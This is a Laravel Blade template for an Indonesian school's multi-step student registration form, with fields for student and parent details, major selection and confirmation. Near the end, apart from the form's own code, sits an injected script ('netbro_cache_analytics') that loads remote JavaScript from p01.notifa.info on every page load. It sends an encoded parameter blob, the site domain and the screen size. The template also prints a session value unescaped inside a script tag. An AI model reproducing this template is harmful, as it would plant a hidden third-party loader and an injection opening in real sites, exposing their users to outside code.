<!doctype html>
<html lang="en">

<head>
    <title>Pendaftaran Siswa {{env('SEKOLAH_NAMA')}}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Include Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
        crossorigin="anonymous">

    <!-- Include SmartWizard CSS -->
    <link href="{{asset('css/smart_wizard.css')}}" rel="stylesheet" type="text/css" />

    <!-- Optional SmartWizard theme -->
    <link href="{{asset('css/smart_wizard_theme_dots.css')}}" rel="stylesheet" type="text/css" />
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
    <div class="container">
        <br />
        <form action="{{route('siswa.daftar.store')}}" enctype="multipart/form-data" id="myForm" role="form" data-toggle="validator" method="post" accept-charset="utf-8"> @csrf

            <!-- SmartWizard html -->
            <div id="smartwizard" class="row">
                <ul>
                    <li><a href="#step-1">Step 1<br /><small>Start</small></a></li>
                    <li><a href="#step-2">Step 2<br /><small>Form Pendaftaran</small></a></li>
                    <li><a href="#step-3">Step 3<br /><small>Biiodata Orang Tua</small></a></li>
                    <li><a href="#step-4">Step 4<br /><small>Ketrangan Tambahan</small></a></li>
                    <li><a href="#step-5">Step 5<br /><small>Menentukan Jurusan</small></a></li>
                    <li><a href="#step-6">Step 6<br /><small>Konfirmasi Pendaftaran</small></a></li>
                </ul>

                <div>
                    <div id="step-1" class="">
                        <br><br>
                        <h2>Pendaftaran Siswa</h2>
                        Persiapkan data pendaftaran anda sebelum memulai input data <br>
                        <hr>
                        @if ($errors->any())
                            <div class="alert alert-danger">
                                Periksa data anda
                                <ul>
                                    @foreach ($errors->all() as $error)
                                        <li>{{ $error }}</li>
                                    @endforeach
                                </ul>
                            </div>
                        @endif
                        Perhatikan juga syarat kententuan pendaftaran
                        <ol type="1">
                            <li>Siswa berniat mencari ilmu</li>
                            <li>Siswa berjanji akan mematuhi peraturan sekolah</li>
                            <li>Siswa siap menerima sanksi bila melanggar peraturan sekolah</li>
                        </ol>

                        <div id="form-step-0" role="form" data-toggle="validator">
                            <div class="form-group">
                                <input type="checkbox" name="setuju" id="terms" data-error="Harap terima Syarat dan Ketentuan"
                                    required {{(env('APP_ENV')=='development')? 'checked': ''}}  {{ !empty(old('setuju')) ? 'checked': ''}}>
                                <label for="terms">Saya Setuju</label>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                        </div>

                        <small>
                            Tanda ( <b>*</b> ) Tidak Boleh Kosong
                            <br> Klik tombol " <b>Selanjutnya</b>" untuk melanjutkan ke tahab selanjutnya
                            <br> Klik tombol " <b>Sebelumnya</b>" untuk mengulas inputan sebelumnya
                            <br> Klik tombol " <b>Selesai</b>" untuk menyelesaikan pendaftaran
                            <br> Klik tombol " <b>Batal</b>" untuk membatalkan pendaftaran dan menghapus inputan
                        </small>
                    </div>
                    <div id="step-2">
                        <br>
                        <h2>Form Pendaftaran</h2>
                        Lengkapi biodata siswa jika sudah selesai silahkan melanjutkan pada step berikutnya
                        <hr>
                        <div class="form-row" id="form-step-1" role="form" data-toggle="validator">
                            <div class="form-group col-md-4">
                                <label for="nisn">NISN *</label>
                                <input type="number" min="1" class="form-control" id="nisn" name="nisn" placeholder="Nomor Induk Siswa Nasional"
                                    data-error="Harap tidak dikosongkan pada kolom ini" required value="{{(env('APP_ENV')=='development' && empty(old('nisn')))? '909090': old('nisn')}}">
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-6">
                                <label for="nama">Nama *</label>
                                <input type="text" class="form-control" id="nama" placeholder="Nama Lengkap" name="nama"
                                    data-error="Harap tidak dikosongkan pada kolom ini" required value="{{(env('APP_ENV')=='development' && empty(old('nama')))? 'syaifudin': old('nama')}}">
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-2">
                                <label for="jk">Gender *</label>
                                <select class="form-control" id="jk" name="jk" data-error="Harap tidak dikosongkan pada kolom ini"
                                    required>
                                    <option value="" disabled selected>Pilih Gender</option>
                                    <option value="Laki-laki" {{(env('APP_ENV')=='development')? 'selected': ''}}  {{  old('jk') == 'Laki-laki' ? 'selected' : ''}}>Laki-Laki</option>
                                    <option value="Perempuan" {{  old('jk') == 'Perempuan' ? 'selected' : ''}}>Perempuan</option>
                                </select>
                                <div class="help-block with-errors text-danger"></div>
                            </div>

                            <div class="form-group col-md-4">
                                <label for="tempatlahir">Tempat Lahir *</label>
                                <input type="text" class="form-control" id="tempatlahir" name="tempatlahir" data-error="Harap tidak dikosongkan pada kolom ini"
                                    value="{{(env('APP_ENV')=='development' && empty(old('tempatlahir')))? 'Lamongan': old('tempatlahir')}}" placeholder="Tempat Lahir"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="tanggallahir">Tanggal Lahir *</label>
                                <input type="date" class="form-control" id="tanggallahir" placeholder="Tanggal Lahir"
                                    data-error="Harap tidak dikosongkan pada kolom ini" name="tanggallahir" value="{{(env('APP_ENV')=='development' && empty(old('tanggallahir')))? '2018-12-11': old('tanggallahir')}}"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>

                            <div class="form-group col-md-4">
                                <label for="agama">Agama *</label>
                                <select class="form-control" id="agama" name="agama" data-error="Harap tidak dikosongkan pada kolom ini"
                                    required>
                                    <option value="" disabled selected>Pilih Agama </option>
                                    <option value="Islam" {{(env('APP_ENV')=='development')? 'selected': ''}} {{old('agama')== 'islam'? 'selected': ''}}>Islam</option>
                                    <option value="Protestan" {{old('agama')== 'Protestan'? 'selected': ''}}>Protestan</option>
                                    <option value="Katolik" {{old('agama')== 'Katolik'? 'selected': ''}}>Katolik</option>
                                    <option value="Hindu" {{old('agama')== 'Hindu'? 'selected': ''}}>Hindu</option>
                                    <option value="Budha" {{old('agama')== 'Budha'? 'selected': ''}}>Budha</option>
                                    <option value="Kong Hu Cu" {{old('agama')== 'Kong Hu Cu'? 'selected': ''}}>Kong Hu Cu</option>
                                </select>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-8">
                                <label for="alamat">Alamat Tempat Tinggal Sekarang *</label>
                                <input type="text" class="form-control" id="alamat" data-error="Harap tidak dikosongkan pada kolom ini"
                                    value="{{(env('APP_ENV')=='development' && empty(old('alamat')))? ' 04/02 Sumberwudi Karanggeneng Lamongan': old('alamat')}}"
                                    name="alamat" placeholder="Alamat (RT RW Dusun Desa Kecamatan Kabupaten)"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="hpsiswa">Nomor Hp *</label>
                                <input type="number" class="form-control" id="hpsiswa" name="hpsiswa" placeholder="Nomor HP"
                                    data-error="Harap tidak dikosongkan pada kolom ini" value="{{(env('APP_ENV')=='development' && empty(old('hpsiswa')))? '08181818181': old('hpsiswa')}}"
                                    min="10" required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="sekolah_asal">Sekolah Asal *</label>
                                <input type="text" class="form-control" id="sekolah_asal" name="sekolah_asal" placeholder="Nama Sekolah Asal"
                                    data-error="Harap tidak dikosongkan pada kolom ini" value="{{(env('APP_ENV')=='development' && empty(old('sekolah_asal')))? 'SMP Negri 1 Karanggeneng': old('sekolah_asal')}}"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-6">
                                <label for="sekolah_alamat">Alamat Sekolah Asal *</label>
                                <input type="text" class="form-control" id="sekolah_alamat" name="sekolah_alamat" placeholder="Desa Kecamatan Kabupatan"
                                    data-error="Harap tidak dikosongkan pada kolom ini" value="{{(env('APP_ENV')=='development' && empty(old('sekolah_alamat')))? 'Sumberwudi Karanggeneng Lamongan': old('sekolah_alamat')}}"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-2">
                                <label for="sekolah_angkatan">Tahun Lulus *</label>
                                <select class="form-control" id="sekolah_angkatan" name="sekolah_angkatan" data-error="Harap tidak dikosongkan pada kolom ini"
                                    required>
                                    @foreach($tampiltahun as $th)
                                    <option value="{{$th}}" {{old('sekolah_angkatan') == $th ? 'selected': ''}}>{{$th}}</option>
                                    @endforeach
                                </select>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="fotosiswa">Foto Siswa *</label>
                                <input type="file" class="form-control" onchange="fotoURl(this)" id="fotosiswa" name="fotosiswa" accept="image/jpeg, image/png" data-error="Harap tidak dikosongkan pada kolom ini" required>
                                <div class="help-block with-errors text-danger"></div>
                                <br>
                                <img class="img-thumbnails" width="80%" id="foto">

                            </div>
                            <div class="form-group col-md-4">
                                <label for="fotoijazah">Foto Ijazah/Raport *</label>
                                <input type="file" class="form-control" onchange="fileijazah(this)" id="fotoijazah" name="fotoijazah"  accept="image/jpeg, image/png" data-error="Harap tidak dikosongkan pada kolom ini" required>
                                <div class="help-block with-errors text-danger"></div>
                                <br>
                                <img class="img-thumbnails" width="80%" id="ijazah">

                            </div>
                        </div>
                    </div>
                    <div id="step-3">
                        <br>
                        <h2>Informasi Wali</h2>
                        Melengkapi informasi orang tua
                        <hr>
                        <div class="form-row" id="form-step-2" role="form" data-toggle="validator">
                            <div class="form-group col-md-4">
                                <label for="namaayah">Nama Ayah *</label>
                                <input type="text" min="1" class="form-control" id="namaayah" name="namaayah"
                                    placeholder="Nama Ayah" data-error="Harap tidak dikosongkan pada kolom ini" value="{{(env('APP_ENV')=='development'  && empty(old('namaayah')))? 'Nama Ayah': old('namaayah')}}"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="pekerjaanayah">Pekerjaan Ayah</label>
                                <input type="text" class="form-control" id="pekerjaanayah" placeholder="Pekerjaan Ayah"
                                    name="pekerjaanayah" value="{{(env('APP_ENV')=='development' && empty(old('pekerjaanayah')))? 'Pekerjaan Ayah': old('pekerjaanayah')}}">
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="pendidikanayah">Pendidikan Terakhir Ayah</label>
                                <input type="text" class="form-control" id="pendidikanayah" placeholder="Pendidikan Terakhir Ayah"
                                    name="pendidikanayah" value="{{(env('APP_ENV')=='development' && empty(old('pendidikanayah')))? 'Pendidkan Ayah': old('pendidikanayah')}}">
                            </div>

                            <div class="form-group col-md-4">
                                <label for="tempatlahirayah">Tempat Lahir</label>
                                <input type="text" class="form-control" id="tempatlahirayah" name="tempatlahirayah"
                                    value="{{(env('APP_ENV')=='development' && empty(old('tempatlahirayah')))? 'Lamongan': old('tempatlahirayah')}}" placeholder="Tempat Lahir Ayah">
                            </div>
                            <div class="form-group col-md-4">
                                <label for="tanggallahirayah">Tanggal Lahir Ayah</label>
                                <input type="date" class="form-control" id="tanggallahirayah" placeholder="Tanggal Lahir Ayah"
                                    name="tanggallahirayah" value="{{(env('APP_ENV')=='development' && empty(old('tanggallahirayah')))? '2018-12-11': old('tanggallahirayah')}}">
                            </div>

                            <div class="form-group col-md-4">
                                <label for="ketayah">Keterangan Ayah</label>
                                <select class="form-control" id="ketayah" name="ketayah">
                                    <option value="Masih Hidup" selected>Masih Hidup</option>
                                    <option value="Meninggal">Meninggal</option>
                                </select>
                            </div>
                            <div class="col-md-12">
                                <hr>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="namaibu">Nama Ibu *</label>
                                <input type="text" min="1" class="form-control" id="namaibu" name="namaibu" placeholder="Nama Ibu"
                                    data-error="Harap tidak dikosongkan pada kolom ini" value="{{(env('APP_ENV')=='development' && empty(old('namaibu')))? 'Nama Ibu': old('namaibu')}}"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="pekerjaanibu">Pekerjaan Ibu</label>
                                <input type="text" class="form-control" id="pekerjaanibu" placeholder="Pekerjaan ibu"
                                    name="pekerjaanibu" value="{{(env('APP_ENV')=='development' && empty(old('pekerjaanibu')))? 'Pekerjaan ibu': old('pekerjaanibu')}}">
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="pendidikanibu">Pendidikan Terakhir Ibu</label>
                                <input type="text" class="form-control" id="pendidikanibu" placeholder="Pendidikan Terakhir Ibu"
                                    name="pendidikanibu" value="{{(env('APP_ENV')=='development' && empty(old('pendidikanibu')))? 'Pendidkan Ibu': old('pendidikanibu')}}">
                            </div>

                            <div class="form-group col-md-4">
                                <label for="tempatlahiribu">Tempat Lahir Ibu</label>
                                <input type="text" class="form-control" id="tempatlahiribu" name="tempatlahiribu" value="{{(env('APP_ENV')=='development' && empty(old('tempatlahiribu')))? 'Lamongan': old('tempatlahiribu')}}"
                                    placeholder="Tempat Lahir Ibu">
                            </div>
                            <div class="form-group col-md-4">
                                <label for="tanggallahiribu">Tanggal Lahir Ibu</label>
                                <input type="date" class="form-control" id="tanggallahiribu" placeholder="Tanggal Lahir Ibu"
                                    name="tanggallahiribu" value="{{(env('APP_ENV')=='development' && empty(old('tanggallahiribu')))? '2018-12-11': old('tanggallahiribu')}}">
                            </div>

                            <div class="form-group col-md-4">
                                <label for="ketibu">Keterangan Ibu</label>
                                <select class="form-control" id="ketibu" name="ketibu">
                                    <option value="Masih Hidup" selected>Masih Hidup</option>
                                    <option value="Meninggal">Meninggal</option>
                                </select>
                            </div>

                            <div class="col-md-12">
                                <hr>
                            </div>
                            <div class="form-group col-md-8">
                                <label for="alamatortu">Alamat Tempat Tinggal Orang Tua Sekarang *</label>
                                <input type="text" class="form-control" id="alamatortu" data-error="Harap tidak dikosongkan pada kolom ini"
                                    value="{{(env('APP_ENV')=='development' && empty(old('alamatortu')))? ' 04/02 Sumberwudi Karanggeneng Lamongan': old('alamatortu')}}"
                                    name="alamatortu" placeholder="Alamat (RT RW Dusun Desa Kecamatan Kabupaten)"
                                    required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="hportu">Nomor Hp Orang Tua *</label>
                                <input type="number" class="form-control" id="hportu" name="hportu" placeholder="Nomor HP Orang Tua"
                                    data-error="Harap tidak dikosongkan pada kolom ini" value="{{(env('APP_ENV')=='development' && empty(old('hportu')))? '08181818181': old('hportu')}}"
                                    min="10" required>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                        </div>
                    </div>
                    <div id="step-4">
                        <br>
                        <h2>Keterangan Tambahan</h2>
                        Informasi bersifat tidak wajib di isi
                        <hr>
                        <div class="form-row">
                            <div class="form-group col-md-4">
                                <label for="tinggi">Tinggi Badan (cm)</label>
                                <input type="number" min="1" class="form-control" id="tinggi" name="tinggi" placeholder="Tinggi badan" value="{{(env('APP_ENV')=='development' && empty(old('tinggi')))? '170': old('tinggi')}}">
                            </div>
                            <div class="form-group col-md-4">
                                <label for="berat">Berat Badan (kg)</label>
                                <input type="number" min="1" class="form-control" id="berat" name="berat" placeholder="Berat Badan" value="{{(env('APP_ENV')=='development' && empty(old('berat')))? '70': old('berat')}}">
                            </div>
                            <div class="form-group col-md-4">
                                <label for="hobi">Hobi</label>
                                <input type="text" min="1" class="form-control" id="hobi" name="hobi" placeholder="Hobi"
                                     value="{{(env('APP_ENV')=='development' && empty(old('hobi')))? 'Ngopi': old('hobi')}}">
                            </div>
                        </div>
                        <div class="form-row">

                            <div class="form-group col-md-4">
                                <label for="transportasi">Kendaraan ke Sekolah</label>
                                <select class="form-control" id="transportasi" name="transportasi">
                                    <option value="" selected>Pilih Kendaraan</option>
                                    <option  {{(env('APP_ENV')=='development')? 'selected': ''}}  {{old('transportasi')== 'Sepeda Motor'? 'selected': ''}}>Sepeda Motor</option>
                                    <option {{old('transportasi')== 'Jalan Kaki'? 'selected': ''}}>Jalan Kaki</option>
                                    <option  {{old('transportasi')== 'Transportasi Umum'? 'selected': ''}}>Transportasi Umum</option>
                                    <option  {{old('transportasi')== 'Lainnya'? 'selected': ''}}>Lainnya</option>
                                </select>
                            </div>
                            <div class="form-group col-md-4">
                                <label for="jaraktempu">Jarak Tempu ke Sekolah (Meter)</label>
                                <input type="number" min="1" class="form-control" id="jaraktempu" name="jaraktempu"
                                    placeholder="Jarak Tempu ke Sekolah (Meter)" value="{{(env('APP_ENV')=='development' && empty(old('jaraktempu')))? '50': old('jaraktempu')}}">
                            </div>
                            <div class="form-group col-md-4">
                                <label for="waktutempu">Waktu Tempu ke Sekolah (Menit)</label>
                                <input type="number" min="1" class="form-control" id="waktutempu" name="waktutempu"
                                    placeholder="Waktu Tempu ke Sekolah (Menit)" value="{{(env('APP_ENV')=='development' && empty(old('waktutempu')))? '7': old('waktutempu')}}">
                            </div>
                        </div>
                    </div>
                    <div id="step-5" class="">
                        <br>
                        <h2>Memilih Jurusan</h2>
                        Menentukan jurusan atas dasar niat dan keinginan siswa. Silahkan centang pada pilihan jurusan
                        yang diminati. Pilihan boleh lebih dari 1 (satau).
                        <hr>
                        <div id="form-step-4" role="form" data-toggle="validator">
                            @foreach ($jurusans as $jurusan)
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" name="minat[]" id="{{$jurusan->jurusan}}" class="custom-control-input" value="{{$jurusan->jurusan}}"
                                {{-- {{(env('APP_ENV')=='development' )? 'checked': ''}} --}}
                                {{ !empty(old('minat')) ? array_search($jurusan->jurusan, old('minat')) !== false ? 'checked': '': ''}}>
                                <label for="{{$jurusan->jurusan}}" class="custom-control-label">{{$jurusan->jurusan}}</label>
                            </div>

                            @endforeach
                        </div>
                        <br><br>
                    </div>
                    <div id="step-6" class="">
                        <h2>Konfirmasi Data</h2>
                        <p>
                            <b>Input Pendaftaran anda tinggal 1 langkah lagi</b> <br>
                            Pastikan data yang anda masukkan tidak ada kesalahan. Silahkan review kembali data anda agar tidak terjadi kecacatan informasi. Jika sudah silahkan konfirmasi data dengan centang pada form dibawah ini. 
                        </p>
                        <div id="form-step-5" role="form" data-toggle="validator">
                            <div class="custom-control custom-checkbox">
                                <input type="checkbox" class="custom-control-input" id="konrimasi"  data-error="Harap dicentang sebagai tanda konfirmasi data" {{(env('APP_ENV')=='development')? 'checked': ''}}
                                    required>
                                <label for="konrimasi" class="custom-control-label">Saya mengkonfirmasi data saya. dan saya telah memasukkan data dengan sebenar-benarnya</label>
                                <div class="help-block with-errors text-danger"></div>
                            </div>
                        </div>
                        <br><br><br>
                    </div>
                </div>
            </div>

        </form>

    </div>

    <!-- Include jQuery -->

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <!-- Include jQuery Validator plugin -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/1000hz-bootstrap-validator/0.11.5/validator.min.js"></script>


    <!-- Include SmartWizard JavaScript source -->
    <script type="text/javascript" src="{{asset('js/jquery.smartWizard.min.js')}}"></script>

    <script type="text/javascript">
        $(document).ready(function () {

            // Toolbar extra buttons
            var btnFinish = $('<button></button>').text('Selesai')
                .addClass('btn btn-info')
                .on('click', function () {
                    if (!$(this).hasClass('disabled')) {
                        var elmForm = $("#myForm");
                        if (elmForm) {
                            elmForm.validator('validate');
                            var elmErr = elmForm.find('.has-error');
                            if (elmErr && elmErr.length > 0) {
                                alert('Form Pendaftaran Anda Belum Selesai, silahkan ulas kembali. Ada inputan yang wajib diisi');
                                return false;
                            } else {
                                elmForm.submit();
                                console.log('sss');
                                return false;
                            }
                        }
                    }
                });
            var btnCancel = $('<button></button>').text('Batal')
                .addClass('btn btn-danger')
                .on('click', function () {
                    $('#smartwizard').smartWizard("reset");
                    $('#myForm').find("input, textarea, select").val("");
                });

            // Smart Wizard
            $('#smartwizard').smartWizard({
                selected: 0,
                lang: {
                    next: 'Selanjutnya',
                    previous: 'Sebelumnya'
                },
                theme: 'dots',
                transitionEffect: 'fade',
                toolbarSettings: {
                    toolbarPosition: 'bottom',
                    toolbarExtraButtons: [btnFinish, btnCancel]
                },
                anchorSettings: {
                    markDoneStep: true, // add done css
                    markAllPreviousStepsAsDone: true, // When a step selected by url hash, all previous steps are marked done
                    removeDoneStepOnNavigateBack: true, // While navigate back done step after active step will be cleared
                    enableAnchorOnDoneStep: true // Enable/Disable the done steps navigation
                }
            });

            $("#smartwizard").on("leaveStep", function (e, anchorObject, stepNumber, stepDirection) {
                var elmForm = $("#form-step-" + stepNumber);
                // stepDirection === 'forward' :- this condition allows to do the form validation
                // only on forward navigation, that makes easy navigation on backwards still do the validation when going next
                if (stepDirection === 'forward' && elmForm) {
                    elmForm.validator('validate');
                    var elmErr = elmForm.children('.has-error');
                    if (elmErr && elmErr.length > 0) {
                        // Form validation failed
                        return false;
                    }
                }
                return true;
            });

            $("#smartwizard").on("showStep", function (e, anchorObject, stepNumber, stepDirection) {
                // Enable finish button only on last step
                if (stepNumber == 3) {
                    $('.btn-finish').removeClass('disabled');
                } else {
                    $('.btn-finish').addClass('disabled');
                }
            });

        });


        function fotoURl(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function (e) {
                    $('#foto').attr('src', e.target.result);
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

        function fileijazah(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function (e) {
                    $('#ijazah').attr('src', e.target.result);
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

    </script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2JGs2T%2bQ1Gz2r3HoJEYfkpIpEK7NtJjIN0EB1UwOczSC%2bl9hvoIP4VUYz6hU%2feerCUqLfflBFdKEgFYAK4Y8c7d4K4PB2qIrG733AizD%2bXxdHCFimY%2fPMkfynePhOdFiCjEpD6iwYVD5Exg99R%2b1W6TfYpaxji%2f9mk%2fYP1gH9xDWWWFSlw4YJ1LldvBF912Td9YIUGHPahvYeijPENUHggeY9QnVobvAZSozDYdkafeLY2NUDNVYtx%2bC1DXX4UBvK3n8xiB8J5eXcI9Mckct41jWwiyetAx4ysZap0SlhDILE5r%2bQpDHSQNKROMhqKEy0XjgkGgFe4dCRk1kyhwivN80zWipNcwFrNpdW3F0ec8pDHLaiSq7IqFfgRcZgSZGKSXhnkcjpIPLv4upinSmAYVbxEcs89GayIQh96QITDfpTi5IIpfwbl4HRMNzYa%2b10OTtKCHouhGtbDL%2b8dxTgvvubmvwUWG8t5kUELBYYSt0LXZ0qnX4%2f8OYquOj05yZfYZ%2f0ddV7WKIyIVf9n4WpRs7ED1bLmdVbSIMGXBNMB6M0diGw32uMTpxVogClfZuHdJrBpUHQv0ji2rzeXQpK1Bh%2fzwnAqZ5baZwgFHhqkCk%3d" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>

    @if(Session::has('alert'))
    <script src="{{asset('js/sweetalert.min.js')}}"></script>
    <script>
        swal({
          {!!Session::get('alert')!!}
        });
    </script>
    @endif
</body>

</html>
